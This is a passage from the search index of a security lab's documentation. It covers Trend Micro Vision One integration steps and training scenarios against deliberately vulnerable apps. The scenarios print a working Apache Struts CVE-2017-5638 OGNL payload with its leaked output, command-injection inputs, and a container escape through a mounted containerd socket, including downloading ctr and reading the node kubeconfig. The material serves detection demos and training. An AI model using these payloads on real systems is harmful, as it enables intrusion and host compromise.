<li>API_KEY: <code>&lt;Your Cloud One API Key&gt;</code></li> <li>AWS_ACCESS_KEY_ID</li> <li>AWS_SECRET_ACCESS_KEY</li> </ul> <p>The included terraform configuration requires additionally:</p> <ul> <li>AWS_REGION</li> <li>AWS_ACCOUNT_ID</li> </ul>"},{"location":"scenarios/cspm/template-scanning-terraform-github-action/#template","title":"Template","text":"<p>Adapt the environment variables in the <code>env:</code>-section as required.</p> Variable Purpose <code>CLOUD_ONE_REGION</code> Cloud One Region of choice (e.g. eu-central-1, us-west-2, etc.). <code>THRESHOLD</code> Defines the fail condition of the action in relation to discovered vulnerabilities. A threshold of <code>critical</code> does allow any number of vulnerabilities up to the criticality <code>high</code>. <p>Allowed values for the <code>THRESHOLD</code> are:</p> <ul> <li><code>any</code>: No vulnerabilities allowed.</li> <li><code>critical</code>: Max risk-level of discovered findings is <code>high</code>.</li> <li><code>high</code>: Max risk-level of discovered findings is <code>medium</code>.</li> <li><code>medium</code>: Max risk-level of discovered findings is <code>low</code>.</li> <li><code>low</code>: Max risk-level of discovered findings is <code>negligible</code>.</li> </ul> <p>If the <code>THRESHOLD</code> is not set, vulnerabilities will not fail the pipeline.</p> <p>The workflow will trigger on <code>git push --tags</code>.</p>"},{"location":"scenarios/cspm/template-scanning-terraform-github-action/#actions","title":"Actions","text":"<p>Navigate to <code>Actions</code> and enable Workflows for the forked repository.</p>"},{"location":"scenarios/cspm/template-scanning-terraform-github-action/#test-it","title":"Test it","text":""},{"location":"scenarios/cspm/template-scanning-terraform-github-action/#create-a-tag","title":"Create a Tag","text":"<p>To trigger the action we simply create a tag.</p> <p>Navigate to <code>Releases</code> on the right and then click on <code>[Draft a new release]</code>.</p> <p>Next, click on <code>[Choose a tag]</code> and type <code>v0.1</code>. A new button called <code>[Create new tag]</code> should get visible. Click on it.</p> <p>Leave the rest as it is and finally click on the green button <code>[Publish release]</code>. This will trigger the action workflow.</p> <p>CLI: <code>git tag v0.1 &amp;&amp; git push --tags</code></p>"},{"location":"scenarios/cspm/template-scanning-terraform-github-action/#check-the-action","title":"Check the Action","text":"<p>Now, navigate to the tab <code>Actions</code> and review the actions output. Click on <code>Terraform Scan Shell</code> or <code>Terraform Scan TfAction</code>.</p> <p>You should now see three main sections:</p> <ol> <li><code>terraform-template-scan-shell.yaml</code> or <code>terraform-template-scan-tfaction.yaml</code>: Clicking on <code>docker</code> reveals the output of the steps from the workflow (and where it failed).</li> <li>Annotations: Telling you in this case that the process completed with exit code 1.</li> <li>Artifacts: These are the artifacts created by the action. There should be a <code>scan-result</code>.</li> </ol> <p>Feel free to review the scan results to find out why the action did fail.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/ds/ds-integrate/","title":"Scenario: Integrate Deep Security with Vision One","text":""},{"location":"scenarios/ds/ds-integrate/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Deep Security</li> <li>Playground One Deep Security Workload</li> </ul> <p>The Playground One can provide a simulates on-premise Deep Security deployment. For simulation purposes it creates a dedicated VPC with the most commonly used architecture, private and public subnets accross two availability zones. </p> <p>Deep Security itself is located within the private subnet and uses a RDS Postgres as the database. The Deep Security Workload configuration creates two linux and one windows server with a deployed and activated Deep Security Agent. Some essential configurations in Deep Security are executed via REST. These are (amongst others):</p> <ul> <li>Creation of a Windows and Linux Policy with valid configurations for the security modules</li> <li>Activation of agent initiated activation</li> <li>Scheduling a recommendation scan for all created instances</li> </ul> <p>For this scenarion you need to ensure to have the Deep Security and Deep Security Workload configurations up and running:</p> <pre><code>pgo --apply dsm\npgo --apply dsw\n</code></pre>"},{"location":"scenarios/ds/ds-integrate/#current-situation","title":"Current Situation","text":"<ul> <li>Deep Security is securing (simulated) on-premise instances.</li> <li>Since you want to move to the Vision One platform you start with integrating Deep Security with the platform.</li> </ul>"},{"location":"scenarios/ds/ds-integrate/#integration-workflow","title":"Integration Workflow","text":"<p>Vision One</p> <ol> <li><code>Vision One Product Instances --&gt; Add Existing Product</code>.</li> <li>Choose <code>Trend Micro Deep Security</code> --&gt; <code>Click to generate the enrollment token</code>.</li> <li>Copy the enrollment token and save the token.</li> <li>Click <code>[Save]</code>.</li> <li>CLick <code>[Connect and Transfer]</code>.</li> </ol> <p>Deep Security</p> <ol> <li>Login to DSM Console as administrator.</li> <li>On the Deep Security software console, go to <code>Administration &gt; System Settings &gt; Trend Vision One</code></li> <li>Under <code>Registration</code>, click <code>Registration enrollment token</code>.</li> <li>In the dialog that appears, paste the enrollment token and click  <code>[Register]</code>.</li> <li>After successful registration, your Deep Security software automatically enables Forward security events to Trend Vision One and changes the Enrollment status to \"Registered\".</li> </ol> <p>Vision One</p> <ol> <li>Go to <code>Product Instance</code> App and verify the DSM On Premise being conncted.</li> <li>Optionally install Endpoint Sensor to the instances.</li> </ol>"},{"location":"scenarios/ds/ds-integrate/#result-and-benefits","title":"Result and Benefits","text":"<p>You now have control of the (simulated) on-premise environment via Vision One.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/ds/ds-migrate/","title":"Scenario: Migrate Deep Security to Vision One","text":""},{"location":"scenarios/ds/ds-migrate/#why-migrate-to-vision-one-saas","title":"Why Migrate to Vision One SaaS","text":"<ul> <li>Power of the Cloud.<ul> <li>Get the latest features continuously.</li> <li>Infinitely scalable architecture.</li> <li>Remove physical infrastructure costs &amp; maintenance.</li> </ul> </li> <li>Data Privacy, Security &amp; Compliance.<ul> <li>Compliance certified: PCI-DSS, ISO, SOC.</li> <li>Multiple Regional Data Centers.</li> <li>Data privacy.</li> <li>Reduce time spent on audits.</li> </ul> </li> <li>Simplified Operations &amp; Monitoring.<ul> <li>24 x 7 x 365 always available.</li> <li>Physically secure cloud environment.</li> <li>Monitored by Trend Micro staff.</li> </ul> </li> </ul>"},{"location":"scenarios/ds/ds-migrate/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Deep Security</li> <li>Playground One Deep Security Workload</li> </ul> <p>The Playground One can provide a simulates on-premise Deep Security deployment. For simulation purposes it creates a dedicated VPC with the most commonly used architecture, private and public subnets accross two availability zones. </p> <p>Deep Security itself is located within the private subnet and uses a RDS Postgres as the database. The Deep Security Workload configuration creates two linux and one windows server with a deployed and activated Deep Security Agent. Some essential configurations in Deep Security are executed via REST. These are (amongst others):</p> <ul> <li>Creation of a Windows and Linux Policy with valid configurations for the security modules</li> <li>Activation of agent initiated activation</li> <li>Scheduling a recommendation scan for all created instances</li> </ul> <p>For this scenarion you need to ensure to have the Deep Security and Deep Security Workload configurations up and running:</p> <pre><code>pgo --apply dsm\npgo --apply dsw\n</code></pre>"},{"location":"scenarios/ds/ds-migrate/#current-situation","title":"Current Situation","text":"<ul> <li>Deep Security is securing (simulated) on-premise instances.</li> <li>Since you want to move to the Vision One platform you want to migrate Deep Security protected computers to Vision One Server &amp; Workload Protection.</li> </ul>"},{"location":"scenarios/ds/ds-migrate/#migration-workflow","title":"Migration Workflow","text":"<p>Vision One</p> <ol> <li>Log in to Trend Vision One, and go to <code>Endpoint Security Operations --&gt; Server &amp; Workload Protection</code>. Choose an existing target instance of Server &amp; Workload Protection.</li> <li>Navigate to <code>Administration &gt; User Management &gt; API keys</code>.</li> <li>Create a new API key with the predefined role \u201cDeep Security Migration\u201d and save the key for later use.</li> </ol> <p></p> <p>Deep Security</p> <ol> <li>Go to DSM and use the feature Migrate to Workload Security. <code>Support --&gt; Migrate to Workload Security</code>.</li> <li>When using this feature, it will need the API key and region. Specify them based on the result of the previous steps.</li> <li>In the tab <code>Configurations</code> select the Common Objects you want to migrate:</li> <li>Directory Exclusions (Windows). To migrate this select is and press <code>[Migrate Selected]</code>.</li> <li>Same for the other Common Objects.</li> <li>In the same tab click on the drop down <code>Migrate Policy (includes references Common Objects)</code> and press <code>[Migrate Selected]</code>.</li> <li>In the tab <code>Cloud Accounts</code> select the cloud accounts to migrate.</li> <li>In the tab <code>Agents</code> click on <code>Migrate using Computers page</code>.</li> <li>Select the agents to migrate in the Computers page. Right click on a selected Computer and go to <code>Actions --&gt; Migrate to Workload Security</code>.</li> <li>In the <code>Cloud One Workload Security Agent Reactivation Configurations</code> adapt the settings when needed and check that <code>Security Policy --&gt; Assign migrated policy</code> is activated.</li> <li>Press the button <code>[Migrate]</code></li> <li>Review the Migration Summary.</li> </ol> <p></p> <p>Turns to</p> <p></p> <p>If the migration is successful, the DSM UI\u2019s status will show \u201cMigrated\u201d or \u201cMove Complete\u201d. </p> <p>Vision One</p> <p>In Trend Vision One Server &amp; Workload Protection, you will also see the new migrated objects appear.</p> <p></p> <p>The migrated policy tree shows the migrated policies including it's dependencies:</p> <p></p>"},{"location":"scenarios/ds/ds-migrate/#optional-deploy-full-endpoint-agent-package","title":"(Optional): Deploy full Endpoint Agent Package","text":"<p>The migrated endpoints only have the basic Endpoint Protection agent installed. To get the full benefit and protection of Trend Vision One Endpoint Security, install the full Endpoint Agent package to enable sensor detection and response.</p> <ol> <li>Go to <code>Endpoint Inventory --&gt; Select the Server &amp; Workload Protection Manager</code>.</li> <li>Click on the <code>i1</code> marker next to the computer you want to upgrade and download the agent package.</li> </ol> <p></p> <p>The downloaded package is named similar to <code>TMServerAgent_Linux_auto_x86_64_Server_and_Workload_Protection_Manager_-_EU.tar</code>. </p> <ol> <li>Transfer the package to the computer via scp.</li> <li>Get the ssh command for the instance by running <code>pgo --output dsw</code>.</li> </ol> <p></p> <ol> <li>Copy and paste the ssh command shown but change <code>ssh</code> to <code>scp</code>, just before the username place the filename of the downloaded agent package and append a <code>:</code>. The complete command should look like this: <code>scp -i /home/markus/projects/opensource/playground/playground-one/pgo-dsm-key-pair.pem -o StrictHostKeyChecking=no &lt;DOWNLOADED TAR FILE NAME&gt; ec2-user@18.156.83.192:</code>.</li> <li>Connect via ssh to the computer.</li> <li>Now, use the <code>ssh</code> shown in the <code>pgo</code> output from above to connect to the computer. Example: <code>ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-dsm-key-pair.pem -o StrictHostKeyChecking=no ec2-user@18.156.83.192</code>.</li> <li>Running <code>ls</code> shows the uploaded package.</li> <li>Run <code>tar xfv &lt;DOWNLOADED TAR FILE NAME&gt;</code>.</li> <li>Run <code>sudo ./tmxbc install</code>.</li> <li>Sensor connectivity turns to <code>Connected</code> in the Endpoint Inventory of Vision One.</li> </ol> <p></p>"},{"location":"scenarios/ds/ds-migrate/#optional-activate-endpoint-sensor-detection-and-response","title":"(Optional): Activate Endpoint Sensor Detection and Response","text":"<p>To activate Endpoint Sensor Detection and Response do the following:</p> <ol> <li>Go to <code>Endpoint Inventory --&gt; Select the Server &amp; Workload Protection Manager</code>.</li> <li>Click on the <code>i1</code> marker next to the computer you want to upgrade.</li> </ol> <p></p> <p>Final result:</p> <p></p>"},{"location":"scenarios/ds/ds-migrate/#result-and-benefits","title":"Result and Benefits","text":"<ul> <li>Workload detection and protection techniques including IDS/IPS, antimalware, firewall, application control, integrity monitoring, log inspection &amp; web reputation.</li> <li>Continuous updates to services, updated by Trend Micro \u2013 leading to better security outcomes.</li> <li>Compliance certifications for PCI-DSS, ISO 27001, ISO 27014, ISO 27017, SOC.</li> <li>Managed compute, storage and network infrastructure \u2013 eliminates operational overhead of managing a solution.</li> <li>24 x 7 x 365 operation and monitoring of the security service.</li> <li>Provided via a highly scalable, high availability, physically secure cloud environment.</li> <li>Disaster recovery and business continuity planning supported by compliance frameworks.</li> <li>Vulnerability, penetration testing, and updating/patching of the service provided by Trend Micro.</li> <li>Annual compliance audits on the service.</li> <li>Access to other Cloud Security services from a common platform.</li> </ul> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/ds/ws-integrate/","title":"Scenario: Integrate Workload Security with Vision One","text":""},{"location":"scenarios/ds/ws-integrate/#prerequisites","title":"Prerequisites","text":"<ul> <li>Cloud One Workload Security instance</li> </ul> <p>It is recommended to have some policies and computers already active in your Workload Security instance.</p>"},{"location":"scenarios/ds/ws-integrate/#current-situation","title":"Current Situation","text":"<ul> <li>Cloud One Workload Security is securing instances.</li> <li>Since you want to move to the Vision One platform you start with integrating Workload Security with the platform.</li> </ul>"},{"location":"scenarios/ds/ws-integrate/#integration-workflow","title":"Integration Workflow","text":"<p>Vision One</p> <ol> <li><code>Vision One Product Instances --&gt; Add Existing Product</code>.</li> <li>Choose <code>Trend Cloud One</code> --&gt; <code>Click to generate the enrollment token</code>. </li> <li>Copy the enrollment token and save the token.</li> <li>Click <code>[Save]</code>.</li> <li>CLick <code>[Connect and Transfer]</code>.</li> </ol> <p>Workload Security</p> <ol> <li>Login to Workload Security Console.</li> <li>On the Workload Security software console, go to <code>Administration &gt; System Settings &gt; Trend Micro Vision One (XDR)</code>.</li> <li>Click <code>Register enrollment token</code>.</li> <li>In the dialog that appears, paste the enrollment token and click  <code>[Register]</code>.</li> <li>After successful registration, your Workload Security software automatically enables Forward security events to Trend Vision One and changes the Enrollment status to \"Registered\".</li> </ol> <p>Vision One</p> <ol> <li>Go to <code>Product Instance</code> App and verify the Workload Security instance being conncted.</li> <li>Optionally install Endpoint Sensor to the instances.</li> </ol>"},{"location":"scenarios/ds/ws-integrate/#result-and-benefits","title":"Result and Benefits","text":"<p>You now have control of the Workload Security instance via Vision One.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/ds/ws-migrate/","title":"Scenario: Migrate Workload Security to Vision One","text":"<p>DRAFT</p>"},{"location":"scenarios/ds/ws-migrate/#prerequisites","title":"Prerequisites","text":"<p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/ecs/apache-struts-rce/","title":"Scenario: Detect Apache Struts RCE Vulnerability Exploitation","text":""},{"location":"scenarios/ecs/apache-struts-rce/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster (Any variant)<ul> <li>Running app: Java-Goof running on vulnerable Tomcat</li> </ul> </li> <li>Extracted contents of <code>exploit.zip</code></li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre> <p>Ensure to have Runtime Security enabled on the Vision One Console for this cluster.</p> <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p> <pre><code>cd ${ONEPATH}\nunzip exploits.zip\n</code></pre>"},{"location":"scenarios/ecs/apache-struts-rce/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/ecs/apache-struts-rce/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"pgo-cnc-ecs-ec2\"\necs_ami_ec2 = \"ami-00a947e5cc1e6d3d3\"\nloadbalancer_dns_ec2 = \"pgo-cnc-ecs-ec2-30050812.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/ecs/apache-struts-rce/#exploit","title":"Exploit","text":"<p>Run:</p> <pre><code>cd ${ONEPATH}/exploits/struts/\n./struts-exploit.sh pgo-cnc-ecs-ec2-30050812.eu-central-1.elb.amazonaws.com\n</code></pre> <p>Expexted result:</p> <pre><code>*   Trying 18.195.245.32:80...\n* Connected to playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com (18.195.245.32) port 80 (#0)\n&gt; GET /todolist/todolist/ HTTP/1.1\n&gt; Host: playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n&gt; User-Agent: curl/7.81.0\n&gt; Accept: */*\n&gt; Content-type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 \n&lt; Date: Tue, 01 Aug 2023 12:45:58 GMT\n&lt; Transfer-Encoding: chunked\n&lt; Connection: keep-alive\n&lt; \nLD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\nECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/46de0786-9920-42aa-bff4-c17fd4d273c5\nCATALINA_HOME=/usr/local/tomcat\nLANG=C.UTF-8\nHOSTNAME=ip-10-0-175-104.eu-central-1.compute.internal\n...\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nmessagebus:x:101:101::/var/run/dbus:/bin/false\n* transfer closed with outstanding read data remaining\n* Closing connection 0\ncurl: (18) transfer closed with outstanding read data remaining\n</code></pre> <p>Vision One Observed Attack Techniques:</p> <p></p> <p>Container Security Runtime Event:</p> <p></p>"},{"location":"scenarios/ecs/runtime-vulnerability/","title":"Scenario: Runtime Vulnerability Scanning","text":""},{"location":"scenarios/ecs/runtime-vulnerability/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster</li> </ul> <p>Ensure to have the ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre> <p>Ensure to have Runtime Scanning enabled on the Vision One Console for this cluster.</p>"},{"location":"scenarios/ecs/runtime-vulnerability/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/ecs/runtime-vulnerability/#overview","title":"Overview","text":"<p>This scenario showcases the vulnerability detection functionalities of Vision One Container Security at runtime in ECS clusters. The deployment of this scenario is based on a container image with plenty of different vulnerabilities.</p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>Reviewing vulnerability findings and searching for a specific vulnerability</li> <li>Proof the finding by exploitation</li> </ul>"},{"location":"scenarios/ecs/runtime-vulnerability/#the-story","title":"The story","text":"<p>Every now and then new critical vulnerabilities are disclosed. A famous one with huge impact was the  vulnerability CVE-2017-5638. </p> <p>On March 6th 2017, a new remote code execution (RCE) vulnerability in Apache Struts 2 was made public. This vulnerability allows a remote attacker to inject operating system commands into a web application through the \u201cContent-Type\u201d header. Written in Java, Apache Struts 2 is the popular open source web application framework. This is yet another incident that adds up to a long list of vulnerabilities in this framework.</p> <p>You want to search and validate for this specific vulnerability in your production environment.</p>"},{"location":"scenarios/ecs/runtime-vulnerability/#goals","title":"Goals","text":"<p>The goal of this scenario is to identify the vulnerable deployment and proof that it is vulnerable.</p>"},{"location":"scenarios/ecs/runtime-vulnerability/#hints","title":"Hints","text":"<p>\u2728 Didn't find the vulnerable deployment?</p> <p>Head over to Container Security --&gt; Runtime vulnerability and search for CVE-2017-5638. \ud83d\ude4c</p>"},{"location":"scenarios/ecs/runtime-vulnerability/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"<p>Head over to Container Security --&gt; Container Protection --&gt; Vulnerabilities --&gt; ECS and search for the vulnerability <code>CVE-2017-5638</code>.</p> <p>Identify the vulnerable deployment/container on the ECS cluster(s)</p> <p></p> <p>Next step is to find out the load balancer address of the vulnerable service. The finding tells us (amongst others) the following:</p> <ul> <li>AWS Account ID: <code>634503960501</code></li> <li>AWS Region of the cluster: <code>eu-central-1</code></li> <li>Cluster name: <code>pgo-cnc-ecs-ec2</code></li> </ul> <p>With this, head over to your AWS console and access the ECS service in the region from above.</p> <p></p> <p>Click on the service name <code>pgo-cnc-ecs-ec2</code> since this provides the vulnerable container <code>goof</code>.</p> <p></p> <p>On the right, click on <code>[View Load Balancer]</code></p> <p></p> <p>This gives you the DNS name.</p> <pre><code>pgo-cnc-ecs-ec2-30050812.eu-central-1.elb.amazonaws.com\n</code></pre> <p>Now, verify the vulnerability by running:</p> <pre><code>cd ${ONEPATH}/exploits/struts/\n./struts-exploit.sh pgo-cnc-ecs-ec2-30050812.eu-central-1.elb.amazonaws.com\n</code></pre> <pre><code>[*] CVE: 2017-5638 - Apache Struts2 S2-045\n[*] cmd: cat /etc/passwd\n\nb'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\n'\n</code></pre> <p>You proofed that the application server of your little goof application is vulnerable to CVE-2017-5638.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/eks/dind-exploitation/","title":"Scenario: ContainerD Abuse","text":""},{"location":"scenarios/eks/dind-exploitation/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios<ul> <li>Running app: System Monitor</li> </ul> </li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre>"},{"location":"scenarios/eks/dind-exploitation/#attribution","title":"Attribution","text":"<p>This scenario is based on Kubernetes Goat but heavily adapted to work an Playground One and EKS.</p>"},{"location":"scenarios/eks/dind-exploitation/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/eks/dind-exploitation/#overview","title":"Overview","text":"<p>In this scenario, we will be focusing on the common and standard ways how to build systems and pipelines that leverage container sockets to create, build and run containers from the underlying container runtime. This has been exploited since the early days of the container ecosystem and even today we see these misconfigurations/use cases in the real world. </p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>You will learn to test and exploit the container UNIX socket misconfigurations</li> <li>Able to exploit container and escape out of the container</li> <li>Learn about ContainerD</li> <li>Learn common misconfigurations in pipelines and CI/CD build systems</li> </ul>"},{"location":"scenarios/eks/dind-exploitation/#the-story","title":"The story","text":"<p>Most of the CI/CD and pipeline systems use the underlying host Docker runtime to build containers for you within the pipeline by using something called DIND (docker-in-docker) with a UNIX socket. Here in this scenario, we try to exploit a very similar misconfiguration and gain access to the host system by escaping out of the container.</p> <p>Note: To get started with the scenario, navigate to <code>http://&lt;loadbalancer_dns_health_check&gt;</code></p>"},{"location":"scenarios/eks/dind-exploitation/#goals","title":"Goals","text":"<p>The goal of this scenario is to escape out of the running container to the host system where the container is running and able to access and perform actions on the host system.</p> <p>Tip: If you are able to obtain containers running in the host system then you have completed this scenario. But definitely, you can advance beyond this exploitation as well by performing post-exploitation, e.g. spinning up an additional container.</p>"},{"location":"scenarios/eks/dind-exploitation/#hints","title":"Hints","text":"Click here  \u2728 Do you know how to run multiple commands in Linux?  The application running here has command injection vulnerability. You can exploit this by using the ; delimiter when passing the input \ud83d\ude4c  \u2728 Able to run system commands, not sure how to access containers?  Identify the mounted UNIX socket volume, and use `ctr` binary to communicate with that with -H flag \ud83c\udf89"},{"location":"scenarios/eks/dind-exploitation/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  Start by checking that DNS resolution is working for your cluster. If this doesn't work, check to see if you have a DNS service like CoreDNS running on your cluster.  <pre><code>www.google.com\n</code></pre>  By looking at the application functionality and dabbling with the input and output, we can see it has standard command injection vulnerability. Assuming it's running in a Linux container we can use the `;` delimiter to run/pass other commands  <pre><code>127.0.0.1; id\n</code></pre>  As we can see it returns the response for the `id` command, now we can analyze the system and see what potential information we can obtain.  It contains `/containerd.sock` mounted into the file system as it's not available commonly in standard systems  <pre><code>; mount\n</code></pre>  Wow! We can see the `/custom/containerd/containerd.sock` mounted in the file system and assuming it's mounted from the host system we need to talk to it for communicating with the UNIX socket via gRPC.  Note: We can use multiple methods for communicating with the `containerd.sock` UNIX socket. Some of them include [official containerd binary](https://containerd.io/downloads/), or a simple `grpcurl` program as well.  The easiest way to interact with containerd is to use the `ctr` command. We can download the official `ctr` static binary from the internet [https://containerd.io/downloads/](https://containerd.io/downloads/).  Then download the appropriate containerd binary to the container. We can use the following command (takes some time, be patient).  <pre><code>; wget https://github.com/containerd/containerd/releases/download/v1.6.20/containerd-1.6.20-linux-amd64.tar.gz -O /tmp/containerd-1.6.20.tgz\n</code></pre>  We can extract the binary from the `containerd-1.6.20.tgz` file so that we can use that to talk to the UNIX socket  <pre><code>; tar -xvzf /tmp/containerd-1.6.20.tgz -C /tmp/ bin/ctr\n</code></pre>  Now we can access the host system by running the following containerd commands with passing `containerd.sock` containerd's gRPC server. Let's check what is running from kubernetes.  <pre><code>; /tmp/bin/ctr -a /custom/containerd/containerd.sock -n=k8s.io containers ls\n</code></pre>  Hooray \ud83e\udd73, now we can see that it has a lot of containers are running in the host system. We can now use different ctr commands to gain more access and further exploitation.  \ud83c\udf89 Success \ud83c\udf89  If you'd like to create containers now, try it. Be beware of the fact that the design of containerd is that clients should be local to the daemon. Running a client in a container is effectively non-local without some very specific configuration (which will vary depending on what you are trying to do)."},{"location":"scenarios/eks/dind-exploitation/#references","title":"References","text":"<ul> <li>Interacting with containerd runtime for kubernetes</li> </ul>"},{"location":"scenarios/eks/escape/","title":"Scenario: Escape to the Host System","text":""},{"location":"scenarios/eks/escape/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios<ul> <li>Running app: System Monitor</li> </ul> </li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre>"},{"location":"scenarios/eks/escape/#attribution","title":"Attribution","text":"<p>This scenario is based on Kubernetes Goat but adapted to work an Playground One and EKS.</p>"},{"location":"scenarios/eks/escape/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/eks/escape/#overview","title":"Overview","text":"<p>This scenario showcases the common misconfigurations and one of the error-prone security issues in Kubernetes, container environments, and the general security world. Giving privileges that are not required for things always makes security worse. This is especially true in the containers and Kubernetes world. You can also apply this scenario further and beyond the container to other systems and services based on the configuration and setup of the cluster environments and resources. In this scenario you will see a privileged container escape to gain access to the host system.</p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>Able to exploit the container and escape out of the docker container</li> <li>You will learn to test and exploit the misconfigured and privileged containers</li> <li>Learn about common misconfigurations and possible damage due to them for the containers, Kubernetes, and clusterized environments</li> </ul>"},{"location":"scenarios/eks/escape/#the-story","title":"The story","text":"<p>Most of the monitoring, tracing, and debugging software requires extra privileges and capabilities to run. In this scenario, you will see a pod with extra capabilities and privileges including HostPath allowing you to gain access to the host system and provide Node level configuration to gain complete cluster compromise.</p> <p>Note: To get started with the scenario, navigate to <code>http://&lt;loadbalancer_dns_system_monitor&gt;</code></p>"},{"location":"scenarios/eks/escape/#goals","title":"Goals","text":"<p>The goal of this scenario is to escape out of the running docker container on the host system using the available misconfigurations. The secondary goal is to use the host system-level access to gain other resources access and if possible even go beyond this container, node, and cluster-level access.</p> <p>Tip: Gain access to the host system and obtain the node level kubeconfig file <code>/var/lib/kubelet/kubeconfig</code>, and query the Kubernetes nodes using the obtained configuration.</p>"},{"location":"scenarios/eks/escape/#hints","title":"Hints","text":"Click here  \u2728 Are you still in the container?  See the mounted file systems, also look the capabilities available for the container using capsh \ud83d\ude4c&lt;  \u2728 Escaped container?  You can recon the system, some interesting places to obtain the node level configuration are `/var/lib/kubelet/kubeconfig` and I hope you know how to query Kubernetes API for nodes? 